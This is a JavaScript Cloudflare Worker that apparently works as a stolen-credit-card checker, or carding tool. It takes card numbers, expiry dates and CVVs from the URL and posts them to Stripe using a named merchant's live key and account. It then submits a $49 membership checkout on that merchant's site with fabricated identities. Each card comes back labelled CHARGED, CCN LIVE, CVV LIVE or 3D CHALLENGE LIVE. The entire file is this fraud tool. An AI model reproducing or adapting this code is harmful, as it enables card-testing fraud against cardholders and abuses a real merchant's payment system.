addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

function typ(cc) {
  cc = cc.toString().charAt(0)
  if (cc === "3") return "amex"
  if (cc === "4") return "visa"
  if (cc === "5") return "mastercard"
  if (cc === "6") return "discover"
  return "Unknown"
}

async function handleRequest(request) {
  try {
    const url = new URL(request.url)
    const path = url.pathname
    const cc = path.split('/card=')[1]

    if (!cc) return new Response(JSON.stringify({Author: "Sahid", Status: "Error"}), {status: 400})

    const [num, mon, yer, cvv] = cc.split("|").map(p => p.trim())
    
    // Generate fake data
    const names = ["John", "Jane", "Mike", "Sarah", "David"]
    const name = names[Math.floor(Math.random() * names.length)].toUpperCase()
    const randomString = Array.from({length: 8}, () => 
      'qwertyuiopasdfghjklzxcvhnm123456789'[Math.floor(Math.random() * 34)]
    ).join('')
    const email = `${name}${randomString}@gmail.com`

    // Stripe API call
    const stripeData = new URLSearchParams({
      "muid": "NA",
      "guid": "NA",
      "sid": "NA",
      "type": "card",
      "referrer": "https://www.rebelsdiet.com",
      "time_on_page": `${Math.floor(Math.random() * (9999999 - 100000) + 100000)}`,
      "card[number]": num,
      "card[cvc]": cvv,
      "card[exp_month]": mon,
      "card[exp_year]": yer,
      "payment_user_agent": "stripe.js/efee6eb491; stripe-js-v3/efee6eb491; split-card-element",
      "pasted_fields": "number",
      "key": "pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX",
      "_stripe_account": "acct_1HKIGdJTpsEG5afM"
    })

    const stripeResponse = await fetch("https://api.stripe.com/v1/payment_methods", {
      method: "POST",
      headers: {
        "authority": "api.stripe.com",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36"
      },
      body: stripeData
    })

    const stripeJson = await stripeResponse.json()
    const paymentMethodId = stripeJson.id

    // Membership checkout
    const checkoutData = new URLSearchParams({
      "level": "3",
      "checkjavascript": "1",
      "other_discount_code": "",
      "username": name,
      "password": "johncarles",
      "password2": "johncarles",
      "bemail": email,
      "bconfirmemail": email,
      "fullname": "",
      "CardType": typ(num),
      "discount_code": "",
      "submit-checkout": "1",
      "javascriptok": "1",
      "payment_method_id": paymentMethodId,
      "AccountNumber": `XXXXXXXXXXXX${num.slice(-4)}`,
      "ExpirationMonth": mon,
      "ExpirationYear": yer
    })

    const checkoutResponse = await fetch("https://www.rebelsdiet.com/membership-account/membership-checkout/", {
      method: "POST",
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.rebelsdiet.com",
        "referer": "https://www.rebelsdiet.com/membership-account/membership-checkout/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36"
      },
      body: checkoutData
    })

    const responseText = await checkoutResponse.text()
    const lowerText = responseText.toLowerCase()

    let msg = "DECLINED"
    if (lowerText.includes("succeeded") || lowerText.includes("membership confirmation") || 
        lowerText.includes("thank you") || lowerText.includes("insufficient funds")) {
      msg = "CHARGED"
    } else if (lowerText.includes("security code is incorrect") || lowerText.includes("invalid cvc")) {
      msg = "CCN LIVE"
    } else if (lowerText.includes("cvc_check") || lowerText.includes("transaction_not_allowed")) {
      msg = "CVV LIVE"
    } else if (lowerText.includes("3d required") || lowerText.includes("otp"))) {
      msg = "3D CHALLENGE LIVE"
    }

    return new Response(JSON.stringify({
      Author: "Sahid",
      Status: msg,
      Gateway: "Stripe Charged $49",
      Card: cc
    }), {
      headers: {'Content-Type': 'application/json'}
    })

  } catch (error) {
    return new Response(JSON.stringify({Author: "Sahid", Status: "Error"}), {
      status: 500,
      headers: {'Content-Type': 'application/json'}
    })
  }
}
